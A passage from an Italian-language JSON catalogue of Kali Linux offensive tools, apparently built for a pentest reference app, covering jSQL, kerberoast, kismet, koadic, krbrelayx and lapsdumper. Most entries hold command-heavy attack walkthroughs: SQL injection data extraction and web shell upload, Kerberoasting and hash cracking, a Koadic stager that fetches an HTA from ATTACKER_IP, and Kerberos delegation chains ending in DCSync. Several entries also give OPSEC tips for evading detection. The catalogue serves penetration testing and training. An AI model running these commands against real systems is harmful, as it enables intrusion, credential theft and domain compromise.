multipli), e OOB (out-of-band via DNS o HTTP per ambienti filtrati).</p><p><strong>Database Browser Visuale:</strong> Una volta confermata l'injection, la GUI presenta una vista ad albero di databases, tabelle, e colonne. Click per enumerare struttura, doppio-click per estrarre dati. Export in vari formati (CSV, JSON, HTML) per analisi offline.</p><p><strong>Integrated Security Tools:</strong> Include tool aggiuntivi: Admin Page Finder (brute force di path amministrativi), Hash Cracker (dizionario e rainbow tables per hash comuni), File Reader (lettura file via SQLi come LOAD_FILE), Web Shell Upload (scrittura file se permessi lo consentono), e SQL Shell per query manuali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia interfaccia grafica\njsql\n\n# === WORKFLOW BASE ===\n# 1. INSERISCI URL VULNERABILE\n# Formato: http://target.com/page.php?id=1\n# jSQL testerà il parametro 'id' per injection\n\n# 2. DETECTION\n# Click pulsante 'Check' o premi Enter\n# jSQL testa automaticamente tutte le tecniche\n# Mostra tipo di injection e database rilevato\n\n# 3. ENUMERAZIONE\n# - Expand 'Databases' nella tree view\n# - Click su database per vedere tabelle\n# - Click su tabella per vedere colonne\n# - Check le colonne da estrarre\n\n# 4. ESTRAZIONE DATI\n# - Seleziona tabella e colonne\n# - Click 'Extract' o doppio-click\n# - I dati appaiono nel pannello risultati\n\n# === OPZIONI AVANZATE ===\n# Tab 'Preferences':\n# - Injection type: forza tecnica specifica\n# - Tampering: encoding per evasion WAF\n# - Proxy: configura Burp/ZAP intercept\n# - Threads: parallelizza extraction\n\n# Tab 'Request':\n# - Custom headers (cookies, auth)\n# - POST data invece di GET\n# - Method selection\n\n# === TOOL INTEGRATI ===\n# Admin Finder:\n# - Tab 'Admin page'\n# - Inserisci base URL\n# - Brute force path comuni\n\n# File Reader (se LOAD_FILE permesso):\n# - Tab 'File'\n# - Specifica path: /etc/passwd\n# - Leggi file dal server\n\n# Web Shell:\n# - Tab 'Upload'\n# - Se INTO OUTFILE permesso\n# - Upload shell PHP/JSP\n\n# === ESEMPIO COMPLETO ===\n# Target: http://vuln.com/news.php?id=1\n# 1. Inserisci URL in jSQL\n# 2. Check -> Detected: MySQL via Union\n# 3. Expand: information_schema -> users\n# 4. Select: username, password columns\n# 5. Extract -> Ottieni credenziali\n# 6. Hash cracker su password hash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, jSQL è ideale quando viene identificata una SQL injection e si vuole estrarre dati rapidamente. La GUI elimina la necessità di costruire payload manualmente, accelerando significativamente l'exploitation di vulnerabilità confermate.</p><p>Per <strong>CTF e Learning</strong>, l'interfaccia visuale aiuta a comprendere come funzionano le diverse tecniche di SQL injection. Osservare i payload generati e le risposte del server è educativo per chi sta imparando SQLi.</p><p>Nel <strong>Bug Bounty</strong>, dopo aver identificato una potenziale SQLi durante reconnaissance, jSQL può rapidamente confermare la vulnerabilità e dimostrare l'impatto estraendo dati sensibili per il report.</p><p>Per <strong>Quick Exploitation</strong>, quando il tempo è limitato e si vuole estrarre dati da una injection nota, jSQL è più veloce di costruire payload manuali o configurare sqlmap da command line. L'interfaccia point-and-click riduce gli errori.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Traffic Volume:</strong> jSQL genera molte richieste HTTP durante detection e extraction. Ogni colonna estratta richiede multiple query. Il volume di traffico è facilmente distinguibile da comportamento utente normale.</p><p><strong>WAF Detection:</strong> I payload SQL injection sono ben noti ai WAF. jSQL include opzioni di tampering (encoding, case variation) ma WAF moderni possono comunque rilevare pattern. Testare prima con injection manuale semplice.</p><p><strong>Logging:</strong> Ogni query injection appare nei log applicativi e potenzialmente nei log database. Le query anomale con UNION SELECT, information_schema, o SLEEP sono altamente sospette.</p><p><strong>Error Messages:</strong> jSQL si basa su error messages per alcune tecniche. In produzione, gli errori sono spesso soppressi. Verificare che la tecnica appropriata sia selezionata per l'ambiente target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "kerberoast",
    "name": "kerberoast",
    "version": "0.0~git20221231.cc5aa6e",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kerberoast/",
    "desc": "Script per Kerberoasting: richiede TGS per service account e cracca hash offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kerberoast</strong> è un toolkit per eseguire attacchi Kerberoasting contro Active Directory, una delle tecniche più efficaci per ottenere credenziali di service account senza privilegi elevati. L'attacco sfrutta il meccanismo Kerberos: qualsiasi utente autenticato può richiedere un Ticket Granting Service (TGS) per qualsiasi servizio che ha un ServicePrincipalName (SPN) configurato. Il TGS è criptato con l'hash NTLM della password del service account, quindi può essere craccato offline senza generare ulteriore traffico verso il domain controller. Service account spesso hanno password deboli (mai cambiate, create manualmente) e privilegi elevati (admin su server, accesso a database). Un Kerberoast riuscito può fornire accesso significativo al dominio. Il toolkit include script per enumerare SPN, richiedere TGS, e formattare hash per cracking con John o Hashcat.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SPN Enumeration:</strong> Interroga Active Directory via LDAP per trovare tutti gli account utente con ServicePrincipalName configurato. Gli account computer hanno sempre SPN ma le loro password sono lunghe e random. Gli account utente con SPN (service account manuali) sono il target principale perché hanno password human-chosen.</p><p><strong>TGS Request Automatizzato:</strong> Una volta identificati i target, richiede TGS per ogni SPN al Domain Controller. Questa è un'operazione completamente legittima nel protocollo Kerberos - qualsiasi utente può richiedere TGS per qualsiasi servizio. Il DC non verifica se l'utente ha effettivamente bisogno del ticket.</p><p><strong>Hash Extraction e Formatting:</strong> Estrae la parte encrypted del TGS che contiene l'hash della password del service account. Formatta l'hash nel formato richiesto da John the Ripper (krb5tgs) o Hashcat (mode 13100/19600/19700 a seconda dell'encryption type).</p><p><strong>Multiple Attack Vectors:</strong> Supporta Kerberoasting standard (RC4), ma anche AES Kerberoasting (più lento da crackare ma più comune in ambienti moderni). Può fare targeted roasting (singolo account) o bulk roasting (tutti gli SPN trovati).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === KERBEROASTING CON IMPACKET ===\n# Enumera SPN e richiedi TGS (all-in-one)\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1 -request\n\n# Solo enumeration (no TGS request)\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1\n\n# Output in formato hashcat\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt\n\n# Con hash NTLM invece di password\nGetUserSPNs.py domain.com/user -hashes :NTHASH -dc-ip 10.10.10.1 -request\n\n# === KERBEROASTING DA WINDOWS ===\n# Con Rubeus\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Target specifico\nRubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt\n\n# Solo RC4 (più veloce da crackare)\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\n\n# Con PowerView\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt\n\n# === CRACKING ===\n# Hashcat (RC4 - TGS-REP etype 23)\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Hashcat (AES256 - TGS-REP etype 18)\nhashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# John the Ripper\njohn --format=krb5tgs --wordlist=rockyou.txt hashes.txt\n\n# Con regole per password complesse\nhashcat -m 13100 hashes.txt rockyou.txt -r best64.rule\n\n# === POST-EXPLOITATION ===\n# Usa password craccata\nsmbclient //server/share -U 'domain\\svc_sql' --password='CrackedPass123'\n\n# O per accesso WMI/PSExec\npsexec.py domain/svc_sql:CrackedPass123@target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial Privilege Escalation in AD</strong>, Kerberoasting è spesso il primo passo dopo aver ottenuto credenziali di un utente normale. Service account tendono ad avere accesso amministrativo a server specifici (SQL, web, file server) e password più deboli di account utente protetti da policy.</p><p>Durante <strong>Red Team Operations</strong>, Kerberoasting permette escalation 'slow and quiet'. Le richieste TGS sono legittime e il cracking è completamente offline. Con password comuni, si possono ottenere credenziali privilegiate in minuti senza triggerare alert.</p><p>Nel <strong>Active Directory Security Assessment</strong>, Kerberoasting verifica la robustezza delle password dei service account. Un audit dovrebbe tentare di craccare tutti gli SPN per identificare account con password deboli prima che un attaccante lo faccia.</p><p>Per <strong>Lateral Movement</strong>, le credenziali dei service account spesso permettono accesso a sistemi specifici che l'utente compromesso inizialmente non poteva raggiungere. Da lì, ulteriore credential harvesting può portare a domain admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>TGS Requests Logging:</strong> Ogni richiesta TGS genera Event ID 4769 nel Security log del Domain Controller. Richiedere TGS per molti SPN in poco tempo è anomalo e può triggerare detection rules. Considerare spreading delle richieste nel tempo.</p><p><strong>Legitimate Traffic:</strong> Una singola richiesta TGS è indistinguibile da uso legittimo. Il problema è la scala: un utente normale non richiede TGS per 50 servizi diversi. Target selettivi su SPN specifici sono meno sospetti.</p><p><strong>Offline Cracking:</strong> Una volta ottenuti i TGS, il cracking avviene completamente offline senza generare alcun traffico di rete. Questa fase è completamente invisibile al target. Solo il successo (uso delle credenziali) sarà rilevabile.</p><p><strong>Encryption Type Matters:</strong> TGS con RC4 (etype 23) sono molto più veloci da crackare rispetto ad AES (etype 18). Ambienti moderni forzano AES, rendendo il cracking più lungo ma non impossibile con hardware adeguato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kismet",
    "name": "kismet",
    "version": "2023.07.R2",
    "icon": "../app/icons/kismet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kismet/",
    "desc": "Wireless sniffer, IDS e wardriving tool con supporto WiFi, Bluetooth, SDR e Zigbee.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kismet</strong> è il più completo e versatile wireless sniffer, network detector, e intrusion detection system passivo disponibile. A differenza di tool che si focalizzano solo su WiFi, Kismet supporta nativamente molteplici protocolli wireless: WiFi 802.11 (tutti gli standard da a/b/g fino a ax), Bluetooth (Classic e Low Energy), Software Defined Radio (RTL-SDR per varie frequenze), Zigbee, Z-Wave, DECT, e altri protocolli RF con hardware appropriato. L'architettura client-server con web UI moderna permette monitoraggio remoto e configurazione dinamica. Kismet opera in modalità completamente passiva, catturando traffico senza mai trasmettere, rendendolo virtualmente indetectable. Include funzionalità IDS per rilevare attacchi wireless (deauth flood, evil twin, probe attacks), integrazione GPS per wardriving con mapping geografico, e logging avanzato in formati multipli (kismet db, pcap, wiglecsv).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol Wireless Capture:</strong> Supporta simultaneamente capture da multiple interfacce e protocolli. Un singolo sistema Kismet può monitorare WiFi su più canali (con channel hopping o interfacce dedicate), Bluetooth con adapter compatibili, e SDR per frequenze arbitrarie. Ogni source contribuisce al database unificato di dispositivi rilevati.</p><p><strong>Comprehensive WiFi Analysis:</strong> Per WiFi, Kismet decodifica beacon, probe request/response, data frames (se non encrypted), e management frames. Identifica SSID (anche hidden), BSSID, canale, encryption type, vendor dei client, potenza del segnale, e traffico. Supporta tutti i tipi di encryption detection: Open, WEP, WPA, WPA2, WPA3.</p><p><strong>Wireless IDS Capabilities:</strong> Rileva automaticamente pattern di attacco: deauthentication flood, evil twin AP (stesso SSID, BSSID diverso), probe flooding, client isolation bypass, e altri attacchi wireless. Gli alert possono essere loggati, inviati a SIEM, o trigger script custom.</p><p><strong>GPS Integration e Wardriving:</strong> Integrazione nativa con gpsd per associare coordinate GPS ad ogni dispositivo rilevato. Export in formato Wigle per contribuzione al database globale. Supporta logging continuo per wardriving mobile con statistiche di coverage e signal mapping.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Prima esecuzione crea config e chiede username/password\nkismet\n# Accedi a http://localhost:2501 per completare setup\n\n# === AVVIO CON INTERFACCE ===\n# Interfaccia WiFi in monitor mode\nkismet -c wlan0\n\n# Multiple interfacce\nkismet -c wlan0 -c wlan1:name=second_wifi\n\n# Con Bluetooth\nkismet -c hci0:type=linuxbluetooth\n\n# Con RTL-SDR\nkismet -c rtl433-0:type=rtl433\n\n# === WEB INTERFACE ===\n# Accedi via browser (default credentials da setup)\nhttp://localhost:2501\n\n# Da remoto (bind su tutte le interfacce)\nkismet --override httpd_bind_address=0.0.0.0\n\n# === WARDRIVING CON GPS ===\n# Avvia gpsd\ngpsd /dev/ttyUSB0\n\n# Kismet con GPS\nkismet -c wlan0 --gps-gpsd\n\n# === LOGGING ===\n# Log in formato pcapng (compatibile Wireshark)\nkismet -c wlan0 --log-types pcapng,kismet\n\n# Log specifico per Wigle\nkismet -c wlan0 --log-types wiglecsv\n\n# Directory di log custom\nkismet -c wlan0 --log-prefix /data/wardriving/session1\n\n# === MONITOR MODE ===\n# Abilita monitor mode manualmente (se necessario)\nairmon-ng start wlan0\nkismet -c wlan0mon\n\n# O lascia a Kismet (potrebbe funzionare)\nkismet -c wlan0:hop=true,ht_channels=true\n\n# === ANALISI DATI ===\n# Kismet salva in SQLite database (.kismet file)\nsqlite3 Kismet-*.kismet\nSELECT * FROM devices WHERE type='Wi-Fi AP';\n\n# Export con kismetdb_strip_packets per file più piccoli\nkismetdb_strip_packets --in Kismet-*.kismet --out stripped.kismet</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Security Assessment</strong>, Kismet fornisce una mappa completa dell'ambiente RF: tutti gli AP, i client associati, dispositivi in probe mode, e potenziali rogue AP. La modalità IDS rileva automaticamente attacchi in corso, mentre l'analisi passiva non altera il normale funzionamento della rete.</p><p>Durante <strong>Wardriving Professionale</strong>, Kismet con GPS crea dataset dettagliati di reti wireless con posizione geografica. I dati possono essere visualizzati su mappa, analizzati per coverage, o contribuiti a database pubblici come Wigle. Utile per survey di copertura o mapping per client.</p><p>Per <strong>IoT e RF Security Research</strong>, con SDR e adapter Zigbee/Z-Wave, Kismet può monitorare dispositivi IoT, sistemi domotici, sensori industriali, e altre comunicazioni RF. Identifica dispositivi, protocolli, e potenziali vulnerabilità in ecosistemi non-WiFi.</p><p>Nel <strong>Incident Response Wireless</strong>, quando si sospetta un attacco wireless (rogue AP, evil twin, credential harvesting via captive portal), Kismet può identificare rapidamente dispositivi anomali, confrontare con baseline note, e raccogliere evidence.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Passive:</strong> Kismet in modalità standard non trasmette mai. Opera solo in ricezione, rendendolo virtualmente indetectable. Nessun probe request, nessun association, nessun traffico generato. L'unica traccia è fisica (presenza del dispositivo).</p><p><strong>Monitor Mode Requirements:</strong> Per cattura WiFi completa, l'interfaccia deve essere in monitor mode. Non tutti gli adapter lo supportano. In monitor mode, l'interfaccia non può essere usata per connessione normale simultaneamente.</p><p><strong>Data Sensitivity:</strong> I log Kismet contengono dati sensibili: MAC address di dispositivi (tracciabili), SSID che possono rivelare informazioni (nomi aziendali, indirizzi), e potenzialmente contenuto di pacchetti non criptati. Proteggere i file di log appropriatamente.</p><p><strong>Legal Considerations:</strong> In molte giurisdizioni, la cattura passiva di traffico wireless pubblicamente accessibile è legale. Tuttavia, registrare o analizzare contenuto di comunicazioni private può non esserlo. Verificare le leggi locali sulla intercettazione wireless.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "koadic",
    "name": "koadic",
    "version": "0~git20210412",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/koadic/",
    "desc": "C2 framework Windows che usa JScript/VBScript per post-exploitation via COM object.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Koadic</strong> (COM Command & Control) è un framework C2 post-exploitation per Windows che utilizza esclusivamente Windows Script Host (JScript e VBScript) e COM objects nativi per tutte le operazioni. A differenza di tool basati su PowerShell (spesso pesantemente monitorati), Koadic sfrutta MSHTA, WScript, CScript, e Rundll32 per eseguire payload, offrendo un approccio Living-off-the-Land che usa solo componenti Windows legittimi. L'implant è completamente fileless - non scrive binari su disco ma opera interamente in memoria tramite script. Il framework include stager multipli per delivery iniziale (HTA, JS, VBS, SCT), un sistema di implant persistente, e moduli per tutte le fasi di post-exploitation: enumeration, credential harvesting, lateral movement, persistence, e privilege escalation. L'architettura supporta operatori multipli simultanei con gestione centralizzata degli zombie (host compromessi).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living-off-the-Land Execution:</strong> Ogni operazione usa componenti Windows nativi: MSHTA per eseguire HTA, WScript/CScript per JScript/VBScript, Rundll32 per chiamate COM. Questi processi sono trusted e spesso whitelisted. Non richiede PowerShell, riducendo il profilo di detection in ambienti con PowerShell monitoring.</p><p><strong>Multiple Stager Options:</strong> Diversi metodi per delivery iniziale: mshta (URL to HTA), regsvr32 (SCT file), certutil (download and execute), bitsadmin (background transfer), diskpeel (persistence via COM hijack). Ogni stager ha diverso profilo di detection e funziona in scenari differenti.</p><p><strong>Comprehensive Post-Exploitation Modules:</strong> Include moduli per: credential dumping (SAM, LSASS, browser passwords), enumeration (users, groups, network, software), lateral movement (WMI, DCOM, PSExec-like), persistence (scheduled task, registry, COM hijack), privilege escalation (UAC bypass, service manipulation), e file operations.</p><p><strong>Zombie Management:</strong> Gli host compromessi ('zombies') sono gestiti centralmente. Ogni zombie ha un ID univoco e può ricevere comandi individualmente o in gruppo. Status monitoring, heartbeat configurable, e auto-reconnect se la connessione cade.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia console Koadic\nkoadic\n# Oppure\npython3 koadic\n\n# === STAGER SETUP ===\n# Lista stager disponibili\n(koadic)> stagers\n\n# Usa stager MSHTA (comune e affidabile)\n(koadic)> use stager/js/mshta\n(koadic)> info\n(koadic)> set SRVPORT 8080\n(koadic)> set SRVHOST 0.0.0.0\n(koadic)> run\n\n# Koadic mostra il comando da eseguire sul target:\n# mshta http://ATTACKER_IP:8080/random.hta\n\n# Altri stager\n(koadic)> use stager/js/regsvr32\n(koadic)> use stager/js/bitsadmin\n(koadic)> use stager/js/certutil\n\n# === GESTIONE ZOMBIES ===\n# Lista zombies connessi\n(koadic)> zombies\n\n# Interagisci con zombie specifico\n(koadic)> zombies 0\n\n# Esegui comando su zombie\n(koadic)> cmdshell 0 whoami\n\n# === POST-EXPLOITATION MODULES ===\n# Lista implant disponibili\n(koadic)> implants\n\n# Credential dumping\n(koadic)> use implant/gather/hashdump_sam\n(koadic)> set ZOMBIE 0\n(koadic)> run\n\n# Mimikatz integration\n(koadic)> use implant/inject/mimikatz_dotnet2js\n\n# Enumeration\n(koadic)> use implant/gather/user\n(koadic)> use implant/gather/computer\n(koadic)> use implant/gather/network\n\n# Persistence\n(koadic)> use implant/persist/registry\n(koadic)> use implant/persist/schtasks\n\n# Lateral movement\n(koadic)> use implant/pivot/wmi\n(koadic)> use implant/pivot/dcom\n\n# UAC Bypass\n(koadic)> use implant/elevate/bypassuac_fodhelper\n\n# === FILE OPERATIONS ===\n# Upload file\n(koadic)> use implant/manage/upload_file\n(koadic)> set LFILE /local/path/to/file\n(koadic)> set RFILE C:\\\\Users\\\\Public\\\\file.exe\n(koadic)> run\n\n# Download file\n(koadic)> use implant/manage/download_file\n\n# === SESSION MANAGEMENT ===\n# Kill zombie specifico\n(koadic)> kill 0\n\n# Exit mantenendo listener\n(koadic)> back\n\n# Exit completamente\n(koadic)> exit</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations in Ambienti PowerShell-Restricted</strong>, quando PowerShell è bloccato, monitorato, o in Constrained Language Mode, Koadic offre un'alternativa efficace. Usa Windows Script Host che è meno comunemente disabilitato e meno intensivamente monitorato in molte organizzazioni.</p><p>Durante <strong>Fileless Post-Exploitation</strong>, l'approccio completamente in-memory di Koadic evita detection basata su file. Non vengono scritti binari su disco (eccetto per alcune operazioni specifiche), riducendo la superficie per antivirus e EDR basati su scanning.</p><p>Nel <strong>Penetration Testing Windows</strong>, Koadic fornisce un framework completo per post-exploitation dopo aver ottenuto esecuzione di codice iniziale. I moduli coprono tutte le fasi: dal credential dumping alla persistence, dal lateral movement alla privilege escalation.</p><p>Per <strong>Testing Detection Capabilities</strong>, Koadic usa tecniche diverse da tool più comuni, permettendo di verificare se le difese rilevano anche approcci MSHTA/JScript-based oltre a PowerShell. Utile per gap analysis della detection coverage.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MSHTA/WScript Monitoring:</strong> Sebbene meno monitorato di PowerShell, MSHTA che carica HTA da URL remote è comunque sospetto. EDR moderni monitorano processi script che fanno network connections o spawano child processes. Sysmon Event ID 1 traccia tutte le esecuzioni.</p><p><strong>Network C2 Traffic:</strong> Le comunicazioni Koadic sono HTTP/HTTPS ma con pattern riconoscibili. Il polling interval, i path URL, e i pattern di traffic sono signature-abili. Considerare proxy chaining o domain fronting per operazioni sensibili.</p><p><strong>Known Signatures:</strong> Koadic esiste da anni e le sue signature sono nei database di molti vendor security. Payload di default possono essere rilevati. Customizzazione e obfuscation possono essere necessari per evadere detection.</p><p><strong>COM Object Abuse:</strong> L'uso estensivo di COM objects può generare eventi distintivi. CreateObject() calls frequenti da processi script, accesso a oggetti COM inusuali, e pattern di interazione con ActiveX sono tutti indicatori potenziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "0.0~git20250127.aef69a7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/krbrelayx/",
    "desc": "Relay e abuse di Kerberos per attacchi unconstrained delegation e S4U2Self.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Krbrelayx</strong> è un toolkit avanzato per sfruttare misconfigurazioni di Kerberos delegation in Active Directory. Kerberos delegation permette ai servizi di agire per conto degli utenti verso altri servizi - quando mal configurata, può essere abusata per impersonare qualsiasi utente, inclusi Domain Admin. Krbrelayx copre tre scenari principali: Unconstrained Delegation (cattura TGT di utenti che si connettono), Constrained Delegation con S4U2Self/S4U2Proxy (impersonation senza interazione dell'utente), e Resource-Based Constrained Delegation (RBCD) abuse. Include anche tool per DNS manipulation necessaria in alcuni attacchi. Questi attacchi rappresentano alcuni dei path più potenti verso Domain Admin in ambienti AD moderni dove Kerberoasting e password spray non funzionano.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unconstrained Delegation Exploitation:</strong> Quando un server ha Unconstrained Delegation, gli utenti che si autenticano verso di esso inviano il loro TGT completo. Krbrelayx cattura questi TGT permettendo di impersonare qualsiasi utente che si connette. Combinato con coercion attacks (PrinterBug, PetitPotam), può forzare Domain Controller a connettersi e rilasciare il loro TGT.</p><p><strong>S4U2Self/S4U2Proxy Attacks:</strong> Service for User (S4U) extensions permettono a un servizio con Constrained Delegation di ottenere ticket per altri servizi. S4U2Self ottiene un ticket per qualsiasi utente (anche se non si autentica), S4U2Proxy lo usa verso i servizi target. Krbrelayx automatizza questa chain per impersonation.</p><p><strong>RBCD (Resource-Based Constrained Delegation):</strong> RBCD può essere configurata da chi controlla l'oggetto target. Se puoi modificare msDS-AllowedToActOnBehalfOfOtherIdentity, puoi autorizzare un computer che controlli a impersonare utenti verso quel target. Krbrelayx configura e sfrutta questo scenario.</p><p><strong>DNS Manipulation:</strong> Alcuni attacchi richiedono che l'attacker abbia un record DNS che punta al suo IP. Krbrelayx include dnstool.py per aggiungere/modificare record DNS quando le condizioni lo permettono (authenticated users di default possono creare nuovi record in AD).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === UNCONSTRAINED DELEGATION ATTACK ===\n# Prerequisito: controllo di un server con Unconstrained Delegation\n# oppure capacità di creare un record DNS che punta all'attacker\n\n# Step 1: Aggiungi DNS record per attacker machine\ndnstool.py -u 'domain\\user' -p password -a add -t A -d ATTACKER_IP \\\n  -r evilhost.domain.com dc.domain.com\n\n# Step 2: Avvia listener krbrelayx\nkrbrelayx.py -hashes :NTLMHASH\n\n# Step 3: Trigger coercion dal DC (PrinterBug)\nprinterbug.py domain/user:password@dc.domain.com evilhost.domain.com\n\n# Oppure PetitPotam\nPetitPotam.py evilhost.domain.com dc.domain.com\n\n# Step 4: krbrelayx cattura il TGT del DC\n# Appare come: [*] Got TGT for DC$@DOMAIN.COM\n\n# Step 5: Usa il TGT per DCSync\nexport KRB5CCNAME=DC\\$.ccache\nsecretsdump.py -k -no-pass dc.domain.com\n\n# === RBCD ATTACK ===\n# Prerequisito: GenericWrite/GenericAll su un computer object\n# o WriteProperty su msDS-AllowedToActOnBehalfOfOtherIdentity\n\n# Step 1: Crea un computer account (se non hai già un machine account)\naddcomputer.py domain.com/user:password -computer-name EVIL$ -computer-pass 'EvilPass123'\n\n# Step 2: Configura RBCD sul target\nrbcd.py -delegate-from EVIL$ -delegate-to TARGET$ domain/user:pass -dc-ip DC_IP\n\n# Step 3: Ottieni ticket impersonando admin verso target\ngetST.py -spn cifs/target.domain.com -impersonate Administrator \\\n  domain.com/EVIL$:EvilPass123\n\n# Step 4: Usa ticket\nexport KRB5CCNAME=Administrator.ccache\nsmbexec.py -k -no-pass target.domain.com\n\n# === S4U2SELF/S4U2PROXY ===\n# Se hai hash di un account con Constrained Delegation\n# verso specifici servizi\n\n# Step 1: Identifica account con delegation\nfindDelegation.py domain.com/user:password\n\n# Step 2: S4U per impersonare admin verso servizio permesso\ngetST.py -spn mssql/target.domain.com -impersonate Administrator \\\n  -hashes :SERVICE_ACCOUNT_HASH domain.com/svc_sql\n\n# Step 3: Usa ticket per accesso al servizio\nexport KRB5CCNAME=Administrator.ccache\nmssqlclient.py -k target.domain.com\n\n# === SHADOWCREDS (bonus) ===\n# Se hai GenericWrite su un computer object\npywhisker.py -d domain.com -u user -p password --target TARGET$ --action add\n# Poi usa il certificato generato per autenticazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Domain Compromise via Unconstrained Delegation</strong>, questo è uno dei path più diretti a Domain Admin. Se riesci a forzare un DC a connettersi a un server con Unconstrained Delegation che controlli (o che puoi impersonare via DNS), ottieni il TGT del DC e puoi fare DCSync per tutti gli hash del dominio.</p><p>Durante <strong>Lateral Movement via RBCD</strong>, se hai write access a un computer object (comune con ACL misconfiguration), puoi configurare RBCD per permettere a un computer che controlli di impersonare qualsiasi utente verso quel target. Non richiede privilegi elevati, solo specifici diritti sull'oggetto.</p><p>Nel <strong>Privilege Escalation con Constrained Delegation</strong>, service account con Constrained Delegation verso servizi sensibili (MSSQL, CIFS, HTTP) possono essere abusati per impersonare admin verso quei servizi. Se cracchi o ottieni l'hash di questi account, puoi impersonare chiunque.</p><p>Per <strong>AD Security Assessment</strong>, verificare la configurazione delegation è critico. Krbrelayx permette di testare se le delegation sono exploitable e dimostrare l'impatto di misconfigurazioni comuni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Kerberos Ticket Events:</strong> Ogni S4U operation genera specifici eventi Kerberos nel DC. Event 4768 (TGT request), 4769 (TGS request), e specificamente events per S4U2Self. Impersonation genera anche 4624 con logon type che può essere sospetto.</p><p><strong>DNS Modifications:</strong> Aggiungere record DNS con dnstool è loggato. Il record DNS rimane visibile e può essere rilevato come anomalo (nuovo record che punta a IP esterno o insolito).</p><p><strong>Coercion Detection:</strong> PrinterBug e PetitPotam generano connessioni anomale dal DC verso altri sistemi. Queste connessioni sono monitorate da soluzioni avanzate. Richiede che SMB/RPC siano raggiungibili.</p><p><strong>RBCD Changes:</strong> Modifiche a msDS-AllowedToActOnBehalfOfOtherIdentity sono loggate e facilmente rilevabili. L'attributo non è comunemente modificato in operazioni normali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "lapsdumper",
    "name": "lapsdumper",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/lapsdumper/",
    "desc": "Estrae password LAPS (Local Admin Password Solution) da Active Directory via LDAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LAPSDumper</strong> è uno strumento Python per estrarre password LAPS (Local Administrator Password Solution) da Active Directory. LAPS è una soluzione Microsoft che gestisce automaticamente le password dell'amministratore locale su ogni computer del dominio, generando password uniche e casuali che vengono memorizzate in attributi LDAP del computer object (ms-Mcs-AdmPwd per LAPS legacy, ms-LAPS-Password per Windows LAPS). L'accesso a questi attributi è controllato tramite ACL - tipicamente solo gli IT admin hanno permessi di lettura. Tuttavia, misconfigurazioni comuni (permessi eccessivi, group membership ereditate) possono permettere a utenti con privilegi limitati di leggere queste password. LAPSDumper automatizza la query LDAP per estrarre tutte le password LAPS accessibili con le credenziali fornite, identificando potenziali escalation paths verso accesso admin locale su workstation e server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LAPS Password Extraction:</strong> Query LDAP per leggere l'attributo ms-Mcs-AdmPwd (LAPS legacy) o 